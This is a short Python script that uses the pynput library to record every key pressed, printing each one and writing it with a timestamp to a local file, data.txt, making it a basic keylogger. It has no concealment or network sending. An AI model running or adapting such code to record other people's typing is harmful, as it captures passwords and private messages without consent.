from pynput import keyboard
import logging

logging.basicConfig(filename="data.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
        try:
            print(key.char)
            logging.info(key.char)
        except AttributeError:
            print(key.name)
            logging.info(key.name)    
                 
        
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()        